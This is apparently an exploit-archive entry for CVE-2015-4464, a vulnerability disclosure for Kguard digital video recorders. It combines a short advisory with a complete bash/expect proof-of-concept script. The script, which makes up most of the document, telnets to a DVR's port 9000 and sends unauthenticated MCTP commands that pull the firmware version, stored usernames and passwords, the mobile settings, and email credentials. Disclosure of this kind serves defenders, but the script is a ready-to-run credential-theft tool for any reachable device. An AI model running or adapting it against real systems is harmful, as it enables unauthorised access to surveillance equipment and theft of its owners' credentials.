@@ -1,0 +1,224 @@
+id: 23798
+date: 06/25/2015
+title: Kguard Digital Video Recorder Bypass Issues Vulnerability
+author: Federick Joe P Fajardo
+cves: CVE-2015-4464
+
+CVEID: CVE-2015-4464
+
+SUBJECT: Insufficient Authorization Checks Request Handling Remote 
+Authentication Bypass for Kguard Digital Video Recorders
+
+DESCRIPTION:  A deficiency in handling authentication and authorization 
+has been found with Kguard 104/108/v2 models. While password-based 
+authentication 
+is used by the ActiveX component to protect the login page, all the 
+communication 
+to the application server at port 9000 allows data to be communicated 
+directly 
+with insufficient or improper authorization.
+
+CVSS Base Score: 9.7
+CVSS Temporal Score: 8.3
+CVSS Environmental Score: Undefined
+CVSS Vector: (AV:N/AC:L/Au:N/C:C/I:C/A:P/E:F/RL:U/RC:UR)
+
+Affected Products and Versions
+
+Kguard Digital Video Recorders: KG-SHA104/KG-SHA108/v2. Other variants 
+that runs 
+the same firmware from Zhuhai Raysharp Technology Co Ltd, are believed to 
+be vulnerable.
+
+Exploit / Proof of Concept:
+
+https://goo.gl/L5ASRo (or see below)
+
+Remediation/Fixes
+
+None.
+
+Workarounds and Mitigations
+
+See: [06]
+
+References:
+
+[01] http://www.securityfocus.com/archive/1/534830
+[02] 
+http://us.kworld-global.com/main/prod_in.aspx?mnuid=1306&modid=10&prodid=527
+[03] http://osvdb.org/show/osvdb/119402
+[04] http://osvdb.org/show/osvdb/119422
+[05] http://osvdb.org/show/osvdb/119403
+[06] 
+https://www.academia.edu/11677554/Kguard_Digital_Video_Recorders_Multiple_Vulnerabilities
+
+
+
+------ kguard-exploit-poc.txt -----
+
+#!/bin/bash
+# Title: Kguard Digital Video Recorders POC Exploit
+# Author: Eric Fajardo - fjpfajardo@ph.ibm.com / 06/15/2015
+
+# CVE-2015-4464 - This POC demonstrates the successful exploitation of 
+# security flaws which has been found with Kguard SHA104/108 models. These
+# Digital Video Recorders suffers from a design flaw in the protocol 
+# implementation which makes the product insecure. Access to these devices
+# are designed for Internet Explorer and uses ActiveX to bridge the
+# communication from the browser to the DVR's application server. 
+# The communication layer between the ActiveX control and the application 
+# server has no authentication and authorization mechanism which may lead
+# to the exposure of all credentials in the device and the ability to do
+# unauthorized modification of the config including functions which can 
+# potentially make the device unoperable.
+
+# A full disclosure can be read at: 
+# https://www.academia.edu/11677554/Multiple_Vulnerabilities_with_Kguard_Digital_Video_Recorders
+
+HOSTID="$2"
+PORTID="$3"
+NARGS=2
+BARGS=65
+
+main(){
+        printf "\033[1mKGUARD EXPLOIT: KGUARD-EXP-POC.SH - `date`\033[0m\n";
+        printf "USAGE: $0 {OPTION} {HOSTNAME} {PORT}\n";
+        printf "EXAMPLE: $0 --getver dvr.johndoe.com 9000\n\n";
+        printf "WHERE:\n";
+        printf "\033[1m--getver\033[0m\t- Get the firmware version.\n";
+    printf "\033[1m--getcred\033[0m\t- Get the DVR's usernames/passwords.\n";
+        printf "\033[1m--getmobile\033[0m\t- Get the DVR's mobile phone config.\n";
+    printf "\033[1m--getemail\033[0m\t- Get the email/password if configured.\n";
+}
+
+# 01 - EXECUTE GETVERSION
+function execute_getver(){
+    echo "[X] - Running option getver...";
+        /usr/bin/expect<<EOD
+    set timeout 20
+    spawn telnet $HOSTID $PORTID
+        expect "Escape character is"
+                send "REMOTE HI_SRDK_MEDIA_GetShowAttr MCTP/1.0\n"
+                send "CSeq:1\n"
+                send "Accept:text/HDP\n"
+                send "Content-Type:text/HDP\n"
+                send "Func-Version:0x10\n"
+                send "Content-Length:15\n\n"
+                send "Segment-Num:0\n"
+        expect "MCTP/1.0 200 OK"
+        sleep 3
+                send "^]\r"
+        expect "telnet>"
+        send  "quit\r"
+exit 1
+EOD
+}
+
+# 02 - EXECUTE GETCRED
+function execute_getcred(){
+    echo "[X] - Running option getcred...";
+    /usr/bin/expect<<EOD
+    set timeout 20
+    spawn telnet $HOSTID $PORTID
+    expect "Escape character is"
+        send "REMOTE HI_SRDK_SYS_USERMNG_GetUserList MCTP/1.0\n"
+        send "CSeq:2\n"
+        send "Accept:text/HDP\n"
+        send "Content-Type:text/HDP\n"
+        send "Func-Version:0x10\n"
+        send "Content-Length:51\n\n"
+        send "Segment-Num:1\n"
+        send "Segment-Seq:1\n"
+        send "Data-Length:4\n\n\n\n"
+        send "...\n"
+    expect "MCTP/1.0 200 OK"
+    sleep 3
+        send "^]\r"
+    expect "telnet>"
+    send "quit\r"
+exit 1
+EOD
+}
+
+# 03 - EXECUTE GETMOBILE
+function execute_getmobile(){
+    echo "[X] - Running option getmobile...";
+        /usr/bin/expect<<EOD
+    set timeout 20
+    spawn telnet $HOSTID $PORTID
+        expect "Escape character is"
+                send "REMOTE HI_SRDK_NET_MOBILE_GetOwspAttr MCTP/1.0\n"
+                send "CSeq:1\n"
+                send "Accept:text/HDP\n"
+                send "Content-Type:text/HDP\n"
+                send "Func-Version:0x10\n"
+                send "Content-Length:15\n\n"
+                send "Segment-Num:0\n"
+        expect "MCTP/1.0 200 OK"
+        sleep 3
+                send "^]\r"
+        expect "telnet>"
+        send  "quit\r"
+exit 1
+EOD
+}
+
+# 04 - EXECUTE GETEMAIL
+function execute_getemail(){
+        echo "[X] - Running option getemail...";
+    /usr/bin/expect<<EOD
+    set timeout 20
+    spawn telnet $HOSTID $PORTID
+        expect "Escape character is"
+                send "REMOTE HI_SRDK_NET_GetEmailAttr MCTP/1.0\n"
+                send "CSeq:1\n"
+                send "Accept:text/HDP\n"
+                send "Content-Type:text/HDP\n"
+                send "Func-Version:0x10\n"
+                send "Content-Length:15\n\n"
+                send "Segment-Num:0\n"
+        expect "MCTP/1.0 200 OK"
+        sleep 3
+                send "^]\r"
+        expect "telnet>"
+        send  "quit\r"
+exit 1
+EOD
+}
+
+[[ $# -lt $NARGS ]] && main && exit $BARGS
+case $1 in
+
+    --getver )
+    printf "\033[1mKGUARD EXPLOIT: KGUARD-EXP-POC.SH - `date`\033[0m\n";
+    execute_getver  
+    exit 0
+    ;;
+
+        --getcred )
+        printf "\033[1mKGUARD EXPLOIT: KGUARD-EXP-POC.SH - `date`\033[0m\n";
+    execute_getcred
+    exit 0
+        ;;
+
+        --getmobile )
+        printf "\033[1mKGUARD EXPLOIT: KGUARD-EXP-POC.SH - `date`\033[0m\n";
+        execute_getmobile
+        exit 0
+        ;;
+
+        --getemail )
+        printf "\033[1mKGUARD EXPLOIT: KGUARD-EXP-POC.SH - `date`\033[0m\n";
+        execute_getemail
+        exit 0
+        ;;
+
+
+    *)
+    printf "\033[1mKGUARD EXPLOIT: KGUARD-EXP-POC.SH - `date`\033[0m\n";
+
+esac
+exit 0
+
+#  0day.today [2023-03-23]  #
